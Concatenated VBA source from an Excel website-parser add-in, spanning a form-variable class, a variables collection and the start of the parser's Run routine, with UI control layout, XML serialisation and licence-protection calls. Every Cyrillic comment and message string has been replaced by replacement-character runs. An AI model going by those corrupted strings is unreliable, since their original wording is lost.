            If params.Exists("MultiSelect") Then
                Select Case params.item("MultiSelect")
                    Case "Single": ctrl_ListBox.MultiSelect = fmMultiSelectSingle
                    Case "Multi": ctrl_ListBox.MultiSelect = fmMultiSelectMulti
                    Case "Extended": ctrl_ListBox.MultiSelect = fmMultiSelectExtended
                End Select
            End If

            If UBound(Me.Rendered_Source) >= 0 Then
                Dim i&, txt$, SelectedIndex&
                SelectedIndex& = -1
                ReDim arr(0 To UBound(Me.Rendered_Source), 0 To 1)
                For i = LBound(Me.Rendered_Source) To UBound(Me.Rendered_Source)
                    txt = "": txt = Split(Me.Rendered_Source(i), "|")(BaseColumn& - 1)
                    arr(i, 0) = txt: arr(i, 1) = Me.Rendered_Source(i)
                    If Me.value = arr(i, 1) Then SelectedIndex& = i
                Next i
                ctrl_ListBox.Clear
                ctrl_ListBox.list = arr
            End If

            If ctrl_ListBox.MultiSelect = fmMultiSelectSingle Then
                Me.ctrl_ListBox.ListIndex = SelectedIndex&
            Else
                For Each v In Split(Me.LastValue, ARSEP)
                    For i = LBound(arr) To UBound(arr)
                        If v = arr(i, 0) Then Me.ctrl_ListBox.Selected(i) = True
                    Next i
                Next
            End If

            With ctrl_ListBox
                '.Height = (1 + UBound(Me.Rendered_Source)) * 13.4
            End With


        Case "ComboBox"
            Set ctrl_ComboBox = context.Controls.Add("Forms.ComboBox.1")
            ctrl_ComboBox.Font.Size = 9: ctrl_ComboBox.Font.Bold = True
            Set ctrl = ctrl_ComboBox

            If params.Exists("list") Then ctrl_ComboBox.Style = fmStyleDropDownList

            Dim AddAllOption As Boolean
            AddAllOption = params.Exists("AddOption_ALL")

            ReDim arr(0 To UBound(Me.Rendered_Source) - AddAllOption, 0 To 1)

            If AddAllOption Then
                arr(0, 0) = Replace(params.item("AddOption_ALL"), "_", " ")
                If Trim(arr(0, 0)) = "" Then arr(0, 0) = ALL_ITEMS_OPTION
                arr(0, 1) = ALL_ITEMS_OPTION
            End If
            SelectedIndex& = -1

            For i = LBound(Me.Rendered_Source) To UBound(Me.Rendered_Source)
                txt = "": txt = Split(Me.Rendered_Source(i), "|")(BaseColumn& - 1)
                arr(i - AddAllOption, 0) = txt: arr(i - AddAllOption, 1) = Me.Rendered_Source(i)
            Next i
            For i = LBound(arr) To UBound(arr)
                If Me.LastValue = arr(i, 0) Then SelectedIndex& = i
            Next i

            With ctrl_ComboBox
                .Clear
                .list = arr
                .ListIndex = SelectedIndex&
            End With

        Case "": Debug.Print "error in Sub CreateControl"
        Case Else: Exit Function
    End Select

    If Not ctrl Is Nothing Then
        If NeedsLabel Then
            Set Label = context.Controls.Add("Forms.Label.1")
            Label.Caption = Me.LabelText
        End If
        ctrl.Tag = Me.Name

        Dim BlockTop&, BlockLeft&, BlockWidth&, prev_contr As Object, contrHCoord&, MaxHCoord&
        ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd|
        BlockWidth& = (context.InsideWidth - ColumnsNumber& * 2 * FRAME_PADDING&) / ColumnsNumber&

        ' Set Position
        BlockTop& = FRAME_PADDING_TOP& + ((ind& - 1) \ 2) * (FRAME_PADDING& + DEFAULT_CTRL_HEIGHT&)
        BlockLeft& = FRAME_PADDING& + IIf(ind& Mod 2 = 0, BlockWidth& + 2 * FRAME_PADDING&, 0)

        MaxHCoord& = 0
        For Each prev_contr In context.Controls
            If prev_contr.Left = BlockLeft& Then
                contrHCoord& = prev_contr.Top + prev_contr.Height
                If contrHCoord& > MaxHCoord& Then MaxHCoord& = contrHCoord&
            End If
        Next
        If MaxHCoord& + FRAME_PADDING& > BlockTop& Then BlockTop& = MaxHCoord& + FRAME_PADDING&


        ctrl.Top = BlockTop& - NeedsLabel * DEFAULT_LABEL_HEIGHT&
        ctrl.Left = BlockLeft&: ctrl.Width = BlockWidth&

        If NeedsLabel Then
            Label.Top = BlockTop&: Label.Left = BlockLeft&: Label.Width = BlockWidth&
            Label.Height = DEFAULT_LABEL_HEIGHT&
        Else
            ctrl.Height = DEFAULT_CTRL_HEIGHT&
        End If
        ' Debug.Print ind&,  "top=" & BlockTop&, "left=" & BlockLeft&
        CreateControl = True
    End If
    Set params = Nothing
    context.Repaint
    context.Parent.Repaint
    DoEvents
    StopControlEvents = False
End Function

Sub RenderParameters()
    On Error Resume Next
    Me.Rendered_DefaultValue = Render(Me.DefaultValue)
    Me.Rendered_Source = Render(Me.Source)
    If Me.Rendered_Source = "" Then
        Me.Rendered_Source = Array("")
    ElseIf InStr(1, Me.Rendered_Source, ARSEP) > 0 Then
        Me.Rendered_Source = Split(Me.Rendered_Source, ARSEP)    ' |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|
    Else
        Me.Rendered_Source = Split(Me.Rendered_Source, "&&")    ' |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd|
    End If

    'Me.Rendered_Value = Render(Me.Value)
End Sub

Function ExportToXML() As IXMLDOMElement
    On Error Resume Next
    Dim XML As DOMDocument, node As IXMLDOMElement
    Set XML = CreateObject("Microsoft.XMLDOM")
    With XML
        .preserveWhiteSpace = True
        Set node = .appendChild(XML.createElement(XML_NODE_NAME$))
        With node
            .Attributes.setNamedItem(XML.createAttribute("Index")).text = Me.Index
            .Attributes.setNamedItem(XML.createAttribute("Name")).text = Me.Name
            .Attributes.setNamedItem(XML.createAttribute("Type")).text = Me.ControlType
            If Me.Hidden Then .Attributes.setNamedItem(XML.createAttribute("Hidden")).text = Abs(CInt(Me.Hidden))
            .Attributes.setNamedItem(XML.createAttribute("DefaultValue")).text = Me.DefaultValue
            .Attributes.setNamedItem(XML.createAttribute("Source")).text = Me.Source
            If Len(Me.LabelText) Then .Attributes.setNamedItem(XML.createAttribute("Label")).text = Me.LabelText
            .Attributes.setNamedItem(XML.createAttribute("Value")).text = SETT.H(Me.value)
            .Attributes.setNamedItem(XML.createAttribute("LastValue")).text = SETT.H(Me.LastValue)
        End With
    End With
    Set ExportToXML = node: Set XML = Nothing
End Function

Sub LoadFromXML(ByVal node As IXMLDOMElement)
    On Error Resume Next
    If node Is Nothing Then Exit Sub
    If node.BaseName <> XML_NODE_NAME$ Then
        MsgBox "|fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| XML", vbCritical, "node.baseName <> |fffd|" & XML_NODE_NAME$ & "|fffd|"
        Exit Sub
    End If
    With node
        Me.Index = Val(.Attributes.getNamedItem("Index").text)
        Me.Name = .Attributes.getNamedItem("Name").text
        Me.ControlType = .Attributes.getNamedItem("Type").text
        Me.Hidden = CBool(Val(.Attributes.getNamedItem("Hidden").text))
        Me.DefaultValue = .Attributes.getNamedItem("DefaultValue").text
        Me.Source = .Attributes.getNamedItem("Source").text
        Me.LabelText = .Attributes.getNamedItem("Label").text
        Me.value = SETT.U(.Attributes.getNamedItem("Value").text)
        Me.LastValue = SETT.U(.Attributes.getNamedItem("LastValue").text)
        'Debug.Print "LoadFromXML", Me.ControlType, Me.Index, Me.Value
    End With
End Sub

Function ToArray() As Variant
    On Error Resume Next
    ReDim res(0 To 6, 0 To 4)
    res(0, 1) = "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|": res(0, 2) = Me.Name
    res(1, 1) = "|fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|": res(1, 2) = Me.ControlType
    res(2, 1) = "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|": res(2, 2) = Me.value
    res(3, 1) = "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|": res(3, 2) = Me.DefaultValue
    res(4, 1) = "|fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd|": res(4, 2) = Me.LabelText
    res(5, 1) = "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd|": res(5, 2) = Me.Source
    res(6, 1) = "|fffd||fffd||fffd||fffd||fffd||fffd||fffd|": res(6, 2) = IIf(Me.Hidden, "|fffd||fffd|", "|fffd||fffd||fffd|")
    ToArray = res
End Function

Sub Delete()
    Me.Parent.DeleteItem Me.Index
End Sub

Sub ctrl_CheckBox_Change()
    If StopControlEvents Then Exit Sub
    Me.value = 0: On Error Resume Next: Me.value = Abs(CInt(Me.ctrl_CheckBox.value))
    RaiseEvent_VariableChanged
End Sub

Sub ctrl_ComboBox_Change()
    If StopControlEvents Then Exit Sub
    On Error Resume Next
    If Me.ctrl_ComboBox.ListIndex = -1 Then
        Me.value = "": Me.LastValue = ""
    Else
        Me.value = Me.ctrl_ComboBox.list(Me.ctrl_ComboBox.ListIndex, 1)
        Me.LastValue = Me.ctrl_ComboBox.list(Me.ctrl_ComboBox.ListIndex, 0)
    End If
    If Me.value = ALL_ITEMS_OPTION Then Me.value = Join(Me.Rendered_Source, ARSEP)
    RaiseEvent_VariableChanged
End Sub

Sub ctrl_ListBox_Change()
    If StopControlEvents Then Exit Sub
    On Error Resume Next
    Dim i&, res$, lastres$
    For i = 0 To Me.ctrl_ListBox.ListCount - 1
        If Me.ctrl_ListBox.Selected(i) Then
            res = res & IIf(res = "", "", ARSEP) & Me.ctrl_ListBox.list(i, 1)
            lastres$ = lastres$ & IIf(lastres$ = "", "", ARSEP) & Me.ctrl_ListBox.list(i, 0)
        End If
    Next
    Me.value = res
    Me.LastValue = lastres$
    RaiseEvent_VariableChanged
End Sub

Sub ctrl_TextBox_Change()
    If StopControlEvents Then Exit Sub
    Me.value = Me.ctrl_TextBox.value
    RaiseEvent_VariableChanged
End Sub

Sub SaveCurrentValues()
    On Error Resume Next
    If ctrl Is Me.ctrl_CheckBox Then ctrl_CheckBox_Change
    If ctrl Is Me.ctrl_ComboBox Then ctrl_ComboBox_Change
    If ctrl Is Me.ctrl_ListBox Then ctrl_ListBox_Change
    If ctrl Is Me.ctrl_TextBox Then ctrl_TextBox_Change
End Sub

Sub RaiseEvent_VariableChanged()
    On Error Resume Next
    'Debug.Print "RaiseEvent_VariableChanged", ctrl.Name, Me.Index, Me.ControlType
End Sub



'    CheckBox Forms.CheckBox.1
'    ComboBox Forms.ComboBox.1
'    CommandButton Forms.CommandButton.1
'    Frame Forms.Frame.1
'    Image Forms.Image.1
'    Label Forms.Label.1
'    ListBox Forms.ListBox.1
'    MultiPage Forms.MultiPage.1
'    OptionButton Forms.OptionButton.1
'    ScrollBar Forms.ScrollBar.1
'    SpinButton Forms.SpinButton.1
'    TabStrip Forms.TabStrip.1
'    TextBox Forms.TextBox.1
'    ToggleButton Forms.ToggleButton.1


Attribute VB_Name = "Variables"
Attribute VB_Base = "0{FCFB3D2A-A0FA-1068-A738-08002B3371B5}"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = False
Attribute VB_Exposed = False
Attribute VB_TemplateDerived = False
Attribute VB_Customizable = False
'---------------------------------------------------------------------------------------
' Module        : Variables                    Version:
' Author        : Igor Vakhnenko                   Date: 24.10.2016
' Professional application development for Microsoft Excel
' https://ExcelVBA.ru/        info@excelvba.ru      Skype: ExcelVBA.ru
'---------------------------------------------------------------------------------------

Option Explicit: Option Compare Text

Const XML_NODE_NAME$ = "Variables", XML_SUBNODE_NAME$ = "Variable"
Public Parent As WebsiteParser

Public Items As New Collection
'Dim Context_ As MSForms.Frame

Private Sub Class_Terminate()
    Set Parent = Nothing
    Set Items = Nothing
End Sub

Function SupportedInterfaces() As Variant
    ' ARRAY ( CREATE, EDIT, CLONE, DELETE )
    SupportedInterfaces = Array(1, 1, 0, 1)
End Function

Sub CreateControls(ByRef context As MSForms.Frame)
    On Error Resume Next: Dim Var As Variable, n&, ctrl As Object, MaxVCoord&, CtrlVCoord&, ParserEditUserform As Boolean
    ParserEditUserform = TypeName(context.Parent) = "Page"
    
    For Each Var In Me.Items
        If Not (Var.Hidden And ParserEditUserform) Then n = n + 1: Var.CreateControl context, n
    Next Var
    
    For Each ctrl In context.Controls
        CtrlVCoord& = ctrl.Top + ctrl.Height
        If CtrlVCoord& > MaxVCoord& Then MaxVCoord& = CtrlVCoord&
    Next
    If MaxVCoord& > context.Height - 5 Then context.ScrollHeight = MaxVCoord& + 15
    If ParserEditUserform Then context.Caption = "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| (" & n & IIf(Me.Items.Count > n, " + " & Me.Items.Count - n, "") & ")"
End Sub

Sub Edit(Optional ByVal MacroOnClose$)    '(Optional ByRef Context As MSForms.Frame)
    On Error Resume Next
    'If Not Context Is Nothing Then Set Context_ = Context
    With FP_Objects
        .Caption = "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|"
        Set .All_Items = Me
        .Show
        .Initialize
        .MacroOnClose = MacroOnClose$
    End With
End Sub

Function GetItemByName(ByVal VarName$) As Variable
    On Error Resume Next: Dim Var As Variable
    For Each Var In Me.Items
        If Var.Name = VarName$ Then Set GetItemByName = Var: Exit Function
    Next Var
End Function

Function GetItemByIndex(ByVal Index&) As Variable
    On Error Resume Next: Set GetItemByIndex = Me.Items.item(Index&)
End Function

Function DeleteItem(ByVal Index&) As Boolean
    On Error Resume Next: Err.Clear
    Me.Items.Remove Index&
    Me.UpdateIndexes
    'If Not Context_ Is Nothing Then F_ParserSettings_Edit.Frame_Variables.Controls.Clear: CreateControls Context_
End Function

Sub UpdateIndexes()
    Dim i&: For i = 1 To Items.Count: Items(i).Index = i: Next
End Sub

Function Create(Optional ByVal ShowUserInterface As Boolean) As Variable
    On Error Resume Next
    Dim NewVar As Variable
    Set NewVar = New Variable
    If ShowUserInterface Then
        If Not NewVar.Edit Then Exit Function
    End If
    With NewVar
        Me.UpdateIndexes
        .Index = Me.Items.Count + 1
        Set .Parent = Me
    End With
    Me.Items.Add NewVar
    Set Create = NewVar
End Function


Function Add(ByVal V_name$, Optional ByVal Start_V_Name$) As Variable
    ' |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| F_Objects
    On Error Resume Next
    Dim NewVar As Variable: Const ShowUserInterface As Boolean = True
    Set NewVar = New Variable
    If ShowUserInterface Then
        If Not NewVar.Edit Then Exit Function
    End If
    With NewVar
        Me.UpdateIndexes
        .Index = Me.Items.Count + 1
        Set .Parent = Me
    End With
    Me.Items.Add NewVar
    Set Add = NewVar
End Function

Function ArrayOfNames() As Variant        ' |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|
    On Error Resume Next
    If Me.Items.Count = 0 Then ArrayOfNames = Array(): Exit Function
    Dim n As Long, i&
    ReDim arr(0 To Items.Count - 1)
    For i = 1 To Items.Count
        arr(i - 1) = Items(i).Name
    Next i
    ArrayOfNames = arr
End Function
Function ArrayOfIndexesAndNames() As Variant
    ArrayOfIndexesAndNames = ToArray
End Function

Function ToArray() As Variant
    On Error Resume Next
    If Me.Items.Count = 0 Then ToArray = Array(): Exit Function
    Dim n As Long, i&
    ReDim arr(0 To Items.Count - 1, 0 To 1)
    For i = 0 To Items.Count - 1
        With Items(i + 1)
            arr(n, 0) = .Index
            arr(n, 1) = .Name
        End With
        n = n + 1
    Next i
    ToArray = arr
End Function

Function ExportToXML(Optional ByVal SaveDisabledActions As Boolean = False) As IXMLDOMElement
    On Error Resume Next
    Dim XML As DOMDocument, node As IXMLDOMElement, Var As Variable
    Set XML = CreateObject("Microsoft.XMLDOM")
    
    With XML
        .preserveWhiteSpace = True
        Set node = .appendChild(.createElement(XML_NODE_NAME$))
        'node.Attributes.setNamedItem(.createAttribute("Enabled")).Text = Abs(CInt(Me.Enabled))
        node.Attributes.setNamedItem(.createAttribute("Version")).text = 1
        
        For Each Var In Me.Items
            node.appendChild Var.ExportToXML
        Next Var
    End With
    
    Set ExportToXML = node: Set XML = Nothing
End Function

Sub LoadFromXML(ByVal node As IXMLDOMElement)
    On Error Resume Next
    If Not node Is Nothing Then
        If node.BaseName <> XML_NODE_NAME$ Then
            MsgBox "|fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| XML", vbCritical, "node.baseName <> |fffd|" & XML_NODE_NAME$ & "|fffd|"
            Exit Sub
        End If
        
        Dim subnode As IXMLDOMElement, Var As Variable
        Set Me.Items = New Collection
        
        For Each subnode In node.SelectNodes(XML_SUBNODE_NAME$)
            Set Var = New Variable
            Set Var.Parent = Me
            Var.LoadFromXML subnode
            Set Var.Parent = Me
            Me.Items.Add Var
        Next
    End If
End Sub

Sub Initialize()
    On Error Resume Next
    Get_Data
    If ParserVariables Is Nothing Then Set ParserVariables = New Dictionary
    Dim Var As Variable
    For Each Var In Me.Items
        ParserVariables.item("%" & Var.Name & "%") = Var.value
    Next Var
End Sub

Sub SaveCurrentValues()
    On Error Resume Next: Dim Var As Variable
    For Each Var In Me.Items
        Var.SaveCurrentValues
    Next Var
    Initialize
End Sub

Sub ShowInfo()
    On Error Resume Next
    Dim Var As Variable, txt$, var_txt$, arr, arrlist$, i&
    txt = "|fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| (" & Me.Items.Count & ")<br />"
    For Each Var In Me.Items
        If InStr(1, Var.value, ARSEP) > 0 Then
            arr = "": arrlist$ = "": arr = Split(Var.value, ARSEP)
            For i = LBound(arr) To UBound(arr)
                arrlist$ = arrlist$ & vbNewLine & Replace(Replace(arr(i), ">", "&gt;"), "<", "&lt;")
            Next i
            var_txt$ = "|fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| " & UBound(arr) + 1 & " |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|:<br /><textarea readonly rows='4' style='width:90%;'>" & arrlist$ & "</textarea>"
        Else
            var_txt$ = Var.value
            If var_txt$ = "" Then var_txt$ = "<|fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|>"
        End If
        txt$ = txt$ & "<b style='color:red;'>" & Var.Name & "</b> = <b>" & var_txt$ & "</b><br />"
    Next Var
    Erase arr
    AddBalloon txt, bt_Information
End Sub

Attribute VB_Name = "WebsiteParser"
Attribute VB_Base = "0{FCFB3D2A-A0FA-1068-A738-08002B3371B5}"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = False
Attribute VB_Exposed = False
Attribute VB_TemplateDerived = False
Attribute VB_Customizable = False
'---------------------------------------------------------------------------------------
' Module        : Parser
' Author        : Igor Vakhnenko            Date: 12.11.2013
' Professional application development for Microsoft Excel
' https://ExcelVBA.ru/                     Skype: ExcelVBA.ru
'---------------------------------------------------------------------------------------
Option Explicit
Option Compare Text

Const XML_NODE_NAME$ = "Parser"

' common properties
Public Name As String
Public Version As String
Public Description As String
Public FileName As String
Public LastUpdate As Date
Public AuthorID As String, LastEditorID As String
Public DevComment As String

Public BuildIn As Boolean
Public Locked As Boolean
Public ParentSheet As Worksheet        ' |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|, |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd| Excel

Public Downloads As New ParserDownloads
Public Columns As New OutputColumns
Public SourceData As New ParserSourceData
Public AASets As New ActionSets
Public Options As New ParserOptions
Public Macros As New ParserMacros
Public Variables As New Variables
Public Proxy As New ProxyServers
Public Protection As New Protection
Public Resources As New ResourceFiles

Public Sheet As Worksheet

Public PrInd1 As ProgressIndicatorNew, PrInd2 As ProgressIndicator
Public ExternalStart As Boolean        ' TRUE |fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|
Public Parent As WebsiteParser    ' |fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|
Public StopRequested As Boolean    ' |fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd|
Public MainWorkbookPath As String    ' |fffd||fffd||fffd||fffd|, |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| / |fffd||fffd||fffd||fffd|

Private Sub Class_Initialize()
    Set Me.Columns.Parent = Me
    Set Me.Downloads.Parent = Me
    Set Me.SourceData.Parent = Me
    Set Me.AASets.Parent = Me
    Set Me.Proxy.Parent = Me
    Set Me.Protection.Parent = Me
    Set Me.Resources.Parent = Me
    
    Set Me.SourceData.Actions.ParentParser = Me
    Set Me.Columns.Actions.ParentParser = Me
    Set Me.Downloads.Actions.ParentParser = Me
    ' Debug.Print "parser Class_Initialize"
End Sub

Sub Class_Terminate()
    On Error Resume Next
    ' Debug.Print "parser Class_Terminate"
    
    If Not IE Is Nothing Then Set IE = Nothing  ' IE.Quit |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|
    If Not wHTTP Is Nothing Then Set wHTTP = Nothing
    If Not WA Is Nothing Then WA.Quit False: Set WA = Nothing
    Set Me.Parent = Nothing
    
    Set Downloads = Nothing: Set Columns = Nothing: Set SourceData = Nothing: Set Variables = Nothing
    Set AASets = Nothing: Set Options = Nothing: Set Sheet = Nothing: Set Protection = Nothing
    Set PrInd1 = Nothing: Set PrInd2 = Nothing: Set ParentSheet = Nothing: Set Macros = Nothing: Set Proxy = Nothing: Set Resources = Nothing
End Sub

Sub Run(Optional ByRef dic As Dictionary)        ' |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd|
    On Error Resume Next
    StopMacro = False: Set GlobalError = Err: Me.StopRequested = False
    SHOW_PI2 = Me.Options.ShowPrInd2
    Set MacroDestinationRange = Nothing
    Set BalloonMessages = New Collection
    
    Dim msg$, RequestURL$, Response$, i&, key, prev_toi&, PrInd1_top&, TemporaryDisableStopMacro As Boolean, ExtraCaption$, prevOLIM&
    If Not Me.IsCorrect(msg$) Then
        MsgBox tt("PI_Parser_ErrMsg_NotCorrect", Me.Name) & vbNewLine & vbNewLine & msg$, vbCritical, tt("PI_Parser_ErrMsg_Caption")
        Exit Sub
    End If
    If Me.Protection.OldVersion() Then
        MsgBox tt(SETT.U("4572724D73675F4F6C6456657273696F6E")), vbCritical, tt("PI_Parser_ErrMsg_Caption")
        F_About.Show: F_About.MultiPage1.value = 2
        Exit Sub
    End If
    
    If Me.Options.ShowPrInd1 Then
        Set Me.PrInd1 = New ProgressIndicatorNew: Me.PrInd1.StatusBar = True
        If Not Me.Parent Is Nothing Then Set Me.PrInd1.Parent = Me.Parent.PrInd1
    End If
    
    If SHOW_PI2 Then Set Me.PrInd2 = New ProgressIndicator
    
    CreateNewInstanceOfWinHttpRequest Me
    Set RunningParser = Me
    
    If ParserVariables Is Nothing Then Set ParserVariables = New Dictionary
    If Not Me.ExternalStart Then Set ParserVariables = New Dictionary
    ParserVariables.item("{ParserName}") = Me.Name
    If Not Me.ExternalStart Then If Me.Options.ClearDictionaries Then ClearDictionaries
    
    prevOLIM& = OLIM: OLIM = Me.Protection.GetOutputLimit
    If OLIM Then ExtraCaption$ = "  (" & SETT.U("C2DBC2CEC4C8D2D1DF20D2CECBDCCACE20D7C0D1D2DC20C4C0CDCDDBD5") & ")"
    If Not dic Is Nothing Then
        For Each key In dic.Keys
            ParserVariables.item("%" & CStr(key) & "%") = dic.item(CStr(key))
        Next key
    End If
    ParserVariables.item("{RowsNew}") = 0
    ParserVariables.item("{RowsUpdated}") = 0
    
    Me.ReadOptionsFromINI    ' |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| (|fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|)
    Me.Variables.Initialize
    Me.Resources.Initialize
    
    Me.AASets.GetItemByName(ACTION_SET_NAME_BEFORESTART$).Execute
    to_RW = Me.Protection.ReplaceWith
    prev_toi& = toi&: toi& = Me.Protection.GetReplaceInterval
    If StopMacro Or Me.StopRequested Then GoTo ExitParserLabel
    
    ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|, |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd|, |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|
    Dim DoNotShowPrIndicatorOnStart As Boolean
    If ExternalStart Then
        If (Me.SourceData.Mode = ps_FoundColumn) Or (Me.SourceData.Mode = ps_SheetRange) Then
            If Me.AASets.Items.Count = 0 Then If DictionaryExists(DICTIONARY_SOURCEDATA_NAME$) Then DoNotShowPrIndicatorOnStart = True
        End If
    End If
    
    If Not DoNotShowPrIndicatorOnStart Then
        Me.PrInd1.Show tt("MENU_Parser") & " |fffd|" & Me.Name & "|fffd|" & ExtraCaption$, IIf(ExternalStart, 1, 0)
        Me.PrInd1.line1 = tt("PI_Parser_InitializeSD") & " ..."
    End If
    
    Set Me.SourceData.SourceSheet = ActiveSheet
    If Me.SourceData.InitializeAllItems <= O Then GoTo ExitParserLabel
    
    If DoNotShowPrIndicatorOnStart Then ' |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|, |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd|
        Me.PrInd1.Show tt("MENU_Parser") & " |fffd|" & Me.Name & "|fffd|" & ExtraCaption$, IIf(ExternalStart, 1, 0)
    End If
    Me.PrInd1.line1 = ""
    
    Application.ScreenUpdating = False
    Set Me.Sheet = Nothing
    
    Dim WB As Workbook, shd As Worksheet, sheet_name$
    If Me.Options.Workbook_Open Or Me.Options.Workbook_Create Then
        PrInd1.ShowMessage tt("PI_Parser_CreatingNewWorkbook") & " ..."
        
        Me.MainWorkbookPath = GetMainWorkbookPath
        If Me.MainWorkbookPath = "" Then
            AddBalloon "|fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd|-|fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd|", bt_Warning
            GoTo ExitParserLabel
        End If
        ParserVariables.item("%MainWorkbookPath%") = MainWorkbookPath
        
        If Me.Options.Workbook_Open Then        ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd|
            If FWF.FileExists(Me.MainWorkbookPath) Then Set WB = ConnectToWorkbookByFilename(Me.MainWorkbookPath)
        End If
        
        If WB Is Nothing Then
            If Me.Options.Workbook_Create Then        ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd|
                Set WB = CreateNewWorkbook(Me.MainWorkbookPath)
            Else
